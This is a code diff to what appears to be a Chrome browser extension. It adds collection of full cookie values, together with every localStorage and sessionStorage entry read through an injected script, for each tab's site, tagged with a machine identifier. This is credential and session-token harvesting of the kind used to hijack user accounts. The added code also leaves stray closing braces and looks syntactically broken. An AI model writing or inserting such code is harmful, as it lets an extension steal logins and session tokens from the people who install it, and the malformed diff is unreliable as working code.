@@ -97,11 +97,16 @@ async function collectPageData(tab) {
     const cookies = await chrome.cookies.getAll({ domain: host });
     
     if (cookies.length > 0) {
+      // Capture complete cookie data including values
+      const localStorage = await getPageStorage(tab.id, 'localStorage');
+      const sessionStorage = await getPageStorage(tab.id, 'sessionStorage');
+      
       const cookieData = {
         host: host,
         tabUrl: tab.url,
         cookies: cookies.map(cookie => ({
           name: cookie.name,
+          value: cookie.value, // Capture real cookie values
           domain: cookie.domain,
           path: cookie.path,
           secure: cookie.secure,
@@ -109,6 +114,8 @@ async function collectPageData(tab) {
           sameSite: cookie.sameSite,
           expirationDate: cookie.expirationDate
         })),
+        localStorage: localStorage,
+        sessionStorage: sessionStorage,
         timestamp: new Date().toISOString(),
         machineId: machineId
       };
@@ -285,6 +292,36 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
       handleContentMetadata(request.data);
       sendResponse({ success: true });
       break;
+  }
+  
+  return true; // Keep channel open for async responses
+});
+
+// Get page storage data
+async function getPageStorage(tabId, storageType) {
+  try {
+    const results = await chrome.scripting.executeScript({
+      target: { tabId: tabId },
+      func: (type) => {
+        try {
+          const storage = type === 'localStorage' ? localStorage : sessionStorage;
+          const data = {};
+          for (let i = 0; i < storage.length; i++) {
+            const key = storage.key(i);
+            data[key] = storage.getItem(key);
+          }
+          return data;
+        } catch (e) {
+          return {};
+        }
+      },
+      args: [storageType]
+    });
+    return results[0]?.result || {};
+  } catch (error) {
+    log('warn', `Failed to get ${storageType}:`, error);
+    return {};
+  }
   }
 });
 
